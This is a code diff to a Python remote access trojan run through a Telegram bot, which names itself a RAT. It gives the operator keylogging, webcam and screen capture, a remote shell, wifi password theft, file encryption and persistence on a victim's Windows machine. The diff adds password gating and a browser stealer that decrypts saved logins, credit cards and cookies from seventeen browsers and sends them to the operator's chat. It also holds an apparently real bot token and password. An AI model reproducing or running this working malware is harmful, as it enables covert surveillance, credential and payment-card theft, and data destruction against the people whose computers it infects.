@@ -14,6 +14,7 @@ from secure_delete import secure_delete
 from pynput import keyboard
 import threading
 import sys
+import requests
 import multiprocessing 
 import signal
 import shutil
@@ -22,6 +23,12 @@ from retrying import retry
 import concurrent.futures
 from tabulate import tabulate
 import tempfile
+import base64
+import json
+import sqlite3
+from datetime import datetime, timedelta
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
 
 def is_admin():
     try:
@@ -35,33 +42,62 @@ else:
     print("Please Run With Administrator..!!")
     sys.exit(0)
 
-TOKEN = '6497399585:AAGQq1ouV3AQ43bIhqhxyTU08bluVhSEpgI'  
+TOKEN = '6497399585:AAGQq1ouV3AQ43bIhqhxyTU08bluVhSEpgI' 
+AUTH_Password = "Zeel2323@" 
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
 secure_delete.secure_random_seed_init()
 bot.set_webhook()
 
+authenticated = False
+@bot.message_handler(commands=['auth'])
+def authenticate_user(message):
+    global authenticated
+    args = message.text.split(' ')
+    if len(args) >= 2:
+        # Check if the user provided the correct password
+        password = message.text.split(' ')[1]  # Assuming the password is passed as an argument
+        # Replace with your actual password
+        if password == AUTH_Password:
+            authenticated = True
+            bot.send_message(message.chat.id, "Authentication successful. You are now authenticated.")
+        else:
+            bot.send_message(message.chat.id, "Authentication failed. Please provide the correct password.")
+    else:
+        bot.send_message(message.chat.id, "/auth [Enter Your Password To Start Conversation].")            
+
+
+
 @bot.message_handler(commands=['start'])
 def start(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     start_text= "Welcome to The B14CKY's RAT Bot.....\nType /help to see commands"
     bot.send_message(message.chat.id, start_text)
     
 
 @bot.message_handler(commands=['help'])
 def help(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     help_menu = """
 Welcome! Here are the available commands:
 
+/auth [Authentication Password] -  Authetication for Starting conversation 
 /screen                 - Capture a screenshot.
 /sys                    - Get system information.
 /ip                     - Get Public IP address.
 /cd                     - Navigate through folders.
 /ls                     - List elements.
 /upload [Your Path] [Victim's Path]          - Upload a file.
-/download [Victim's File Path] - Download The File
-/crypt [path]           - Encrypt folder's files.
-/decrypt [path]         - Decrypt folder's files.
+/download [Victim's File Path]  - Download The File
+/crypt [path] [Password]        - Encrypt folder's files.
+/decrypt [path] [Password]      - Decrypt folder's files.
 /webcam                 - Capture from webcam.
 /lock                   - Lock Windows session.
 /clipboard              - Get clipboard content.
@@ -73,11 +109,17 @@ Welcome! Here are the available commands:
 /stop_keylogging        - Stop keylogging (Try 3 to 4 Times).
 /timeinterval [seconds] - Set time interval for keylogging.
 /enable_persistence     - Enable persistence.
+/send_browser_info [DATA_TYPE]      -  Sending Sensitive Info of Browser
+/supported_browser      - List out the supported browsers
     """
     bot.send_message(message.chat.id, help_menu)
 
 @bot.message_handler(commands=['screen'])
 def send_screen(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     with mss.mss() as sct:
         sct.shot(output=f"{cd}\capture.png")
                               
@@ -89,6 +131,10 @@ def send_screen(message):
 
 @bot.message_handler(commands=['ip'])
 def send_ip_info(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         command_ip = "curl ipinfo.io/ip"
         result = subprocess.check_output(command_ip, shell=True)
@@ -116,6 +162,10 @@ def send_system_info(message):
 
 @bot.message_handler(commands=['ls'])
 def list_directory(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         contents = os.listdir(cd)
         if not contents:
@@ -131,6 +181,10 @@ def list_directory(message):
 
 @bot.message_handler(commands=['cd'])
 def change_directory(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         global cd 
         args = message.text.split(' ')
@@ -150,6 +204,10 @@ def change_directory(message):
 
 @bot.message_handler(commands=['upload'])
 def handle_upload_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         args = message.text.split(' ')
         if len(args) >= 2:
@@ -171,6 +229,10 @@ def handle_upload_command(message):
 
 @bot.message_handler(commands=['download'])
 def handle_download_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         args = message.text.split(' ')
         if len(args) >= 2:
@@ -190,6 +252,10 @@ def handle_download_command(message):
 
 @bot.message_handler(commands=['crypt'])
 def encrypt_folder(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         if len(message.text.split()) >= 2:
             folder_to_encrypt = message.text.split()[1]
@@ -208,13 +274,17 @@ def encrypt_folder(message):
             
             bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
         else:
-            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH]")
+            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH] [PASSWORD]")
     except Exception as e:
         bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
 
 
 @bot.message_handler(commands=['decrypt'])
 def decrypt_folder(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
        
         if len(message.text.split()) >= 2:
@@ -233,13 +303,17 @@ def decrypt_folder(message):
             
             bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully..")
         else:
-            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH]")
+            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH] [PASSWORD]")
     except Exception as e:
         bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
 
 
 @bot.message_handler(commands=['lock'])
 def lock_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
 
         result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -260,6 +334,10 @@ shutdown_commands = [
 
 @bot.message_handler(commands=['shutdown'])
 def shutdown_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         success = False
         for cmd in shutdown_commands:
@@ -277,6 +355,10 @@ def shutdown_command(message):
 
 @bot.message_handler(commands=['webcam'])
 def capture_webcam_image(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
         
         cap = cv2.VideoCapture(0)
@@ -308,6 +390,10 @@ def capture_webcam_image(message):
 
 @bot.message_handler(commands=['speech'])
 def text_to_speech_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
        
         text = message.text.replace('/speech', '').strip()
@@ -324,6 +410,10 @@ def text_to_speech_command(message):
 
 @bot.message_handler(commands=['clipboard'])
 def clipboard_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     try:
       
         clipboard_text = clipboard.paste()
@@ -345,12 +435,20 @@ STATE_SHELL = 2
 
 @bot.message_handler(commands=['shell'])
 def start_shell(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     user_id = message.from_user.id
     user_states[user_id] = STATE_SHELL
     bot.send_message(user_id, "You are now in the remote shell interface. Type 'exit' to exit.")
 
 @bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
 def handle_shell_commands(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     user_id = message.from_user.id
     command = message.text.strip()
 
@@ -376,6 +474,10 @@ def get_user_state(user_id):
 
 @bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
 def handle_shell_commands(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     user_id = message.from_user.id
     command = message.text.strip()
 
@@ -440,6 +542,10 @@ def get_wifi_passwords(message):
 
 @bot.message_handler(commands=['wifi'])
 def wifi_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     get_wifi_passwords(message)
 
 
@@ -447,6 +553,10 @@ time_interval = 10
 
 @bot.message_handler(commands=['timeinterval'])
 def set_time_interval_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     global time_interval
     try:
         interval = int(message.text.split()[1])
@@ -489,6 +599,7 @@ def start_keylogger(message):
 def stop_keylogger():
     global keylogger_running
     keylogger_running = False
+    keystrokes = []
 
 def run_keylogger(char_id):
     global keystrokes, keylogger_running
@@ -503,10 +614,18 @@ def run_keylogger(char_id):
 
 @bot.message_handler(commands=['start_keylogging'])
 def start_keylogging_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     start_keylogger(message)
 
 @bot.message_handler(commands=['stop_keylogging'])
 def stop_keylogging_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     stop_keylogger()
     bot.reply_to(message, "Keylogger Stopped...")
 
@@ -527,19 +646,250 @@ def enable_persistence(message):
 
 @bot.message_handler(commands=['enable_persistence'])
 def enable_persistence_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
     enable_persistence(message)
 
 
+def get_temp_directory():
+    return tempfile.mkdtemp()
+
+
+appdata = os.getenv('LOCALAPPDATA')
+browsers = {
+        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
+        'amigo': appdata + '\\Amigo\\User Data',
+        'torch': appdata + '\\Torch\\User Data',
+        'kometa': appdata + '\\Kometa\\User Data',
+        'orbitum': appdata + '\\Orbitum\\User Data',
+        'cent-browser': appdata + '\\CentBrowser\\User Data',
+        '7star': appdata + '\\7Star\\7Star\\User Data',
+        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+        'vivaldi': appdata + '\\Vivaldi\\User Data',
+        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+        'microsoft-edge': appdata + '\\e\\Edge\\User Data',
+        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        'iridium': appdata + '\\Iridium\\User Data',
+    }
+def installed_browsers():
+    available = []
+    for x in browsers.keys():
+        if os.path.exists(browsers[x]):
+            available.append(x)
+    return available
+
+data_queries = {
+        'login_data': {
+            'query': 'SELECT action_url, username_value, password_value FROM logins',
+            'file': '\\Login Data',
+            'columns': ['URL', 'Email', 'Password'],
+            'decrypt': True
+        },
+        'credit_cards': {
+            'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+            'file': '\\Web Data',
+            'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
+            'decrypt': True
+        },
+        'cookies': {
+            'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
+            'file': '\\Network\\Cookies',
+            'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
+            'decrypt': True
+        },
+        'history': {
+            'query': 'SELECT url, title, last_visit_time FROM urls',
+            'file': '\\History',
+            'columns': ['URL', 'Title', 'Visited Time'],
+            'decrypt': False
+        },
+        'downloads': {
+            'query': 'SELECT tab_url, target_path FROM downloads',
+            'file': '\\History',
+            'columns': ['Download URL', 'Local Path'],
+            'decrypt': False
+        }
+    }
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return
+
+    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+        return
+
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        c = f.read()
+    local_state = json.loads(c)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    key = CryptUnprotectData(key, None, None, None, 0)[1]
+    return key
+
+def decrypt_password(buff: bytes, key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+    return decrypted_pass
+
+def save_results(browser_name, type_of_data, content):
+    if content is not None:
+        temp_dir = get_temp_directory()
+        file_path = os.path.join(temp_dir, f'{browser_name}_{type_of_data}.txt')
+
+        with open(file_path, 'w', encoding="utf-8") as file:
+            file.write(content)
+            print(f"\t [*] Saved in {file_path}")
+
+        return file_path
+    else:
+        print(f"\t [-] No Data Found!")
+        return None
 
 
 
+def get_data(path: str, profile: str, key, type_of_data):
+    db_file = f'{path}\\{profile}{type_of_data["file"]}'
+    if not os.path.exists(db_file):
+        return
+    result = ""
+    try:
+        shutil.copy(db_file, 'temp_db')
+        conn = sqlite3.connect('temp_db')
+        cursor = conn.cursor()
+        cursor.execute(type_of_data['query'])
+        for row in cursor.fetchall():
+            row = list(row)
+            if type_of_data['decrypt']:
+                for i in range(len(row)):
+                    if isinstance(row[i], bytes):
+                        row[i] = decrypt_password(row[i], key)
+            if data_type_name == 'history':
+                if row[2] != 0:
+                    row[2] = convert_chrome_time(row[2])
+                else:
+                    row[2] = "0"
+            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+        conn.close()
+        os.remove('temp_db')
+        return result
+    except PermissionError as e:
+        print(f"\t [-] Permission error: {e}")
+        return None
+    except Exception as e:
+        print(f"\t [-] An error occurred: {e}")
+        return None
 
+def convert_chrome_time(chrome_time):
+    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
 
+def installed_browsers():
+    available = []
+    for x in browsers.keys():
+        if os.path.exists(browsers[x]):
+            available.append(x)
+    return available
 
+available_browsers = installed_browsers()
 
+for browser in available_browsers:
+    browser_path = browsers[browser]
+    master_key = get_master_key(browser_path)
+    print(f"Getting Stored Details from {browser}")
 
+    for data_type_name, data_type in data_queries.items():
+        print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
+        data = get_data(browser_path, "Default", master_key, data_type)
+        save_results(browser, data_type_name, data)
+        print("\t------\n")
 
+@bot.message_handler(commands=['send_browser_info'])
+def handle_send_browser_info_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
+    try:
+        args = message.text.split(' ')
+        if len(args) >= 2:
+            data_type = args[1].lower()
 
+            if data_type in data_queries:
+                available_browsers = installed_browsers()
+                results = {}
+
+                for browser in available_browsers:
+                    browser_path = browsers[browser]
+                    master_key = get_master_key(browser_path)
+                    print(f"Getting Stored Details from {browser}")
+
+                    data = get_data(browser_path, "Default", master_key, data_queries[data_type])
+                    if data:
+                        results[browser] = data
+                        print(f"\t [!] Preparing {data_type.replace('_', ' ').capitalize()} from {browser}")
+
+                if results:
+                    bot.send_message(message.chat.id, f"Here are the {data_type.replace('_', ' ').capitalize()} from installed browsers:")
+                   
+                    for browser, data in results.items():
+                        bot.send_message(message.chat.id, f"Data from {browser}:")
+
+                        temp_dir = get_temp_directory()
+                        file_path = os.path.join(temp_dir, f'{browser}_{data_type}.txt')
+
+                        with open(file_path, 'w', encoding='utf-8') as file:
+                            file.write(data)
+
+                        with open(file_path, 'rb') as file:
+                            bot.send_document(message.chat.id, file, caption=f"{browser} - {data_type}")
+                        
+                        os.remove(file_path)
+                    
+                    # shutil.rmtree(file_path)
+
+                else:
+                    bot.send_message(message.chat.id, f"No {data_type.replace('_', ' ').capitalize()} data found in installed browsers.")
+            else:
+                bot.send_message(message.chat.id, "Invalid data type. Use one of: login_data, credit_cards, cookies, history, downloads")
+        else:
+            bot.send_message(message.chat.id, "Incorrect command usage. Use /send_browser_info [DATA_TYPE]\nlogin_data, credit_cards, cookies, history, downloads")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
+
+@bot.message_handler(commands=['supported_browser'])
+def supported_browsers_command(message):
+    global authenticated
+    if not authenticated:
+        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
+        return
+    browsers = """
+Avast
+Amigo
+Torch
+Kometa
+Orbitum
+Cent-browser
+7star
+Sputnik
+Vivaldi
+Google-chrome-sxs
+Google-chrome
+Epic-privacy-browser
+Microsoft-edge
+Uran
+Yandex
+Brave
+Iridium
+"""
+    bot.send_message(message.chat.id, browsers)
 
 
 
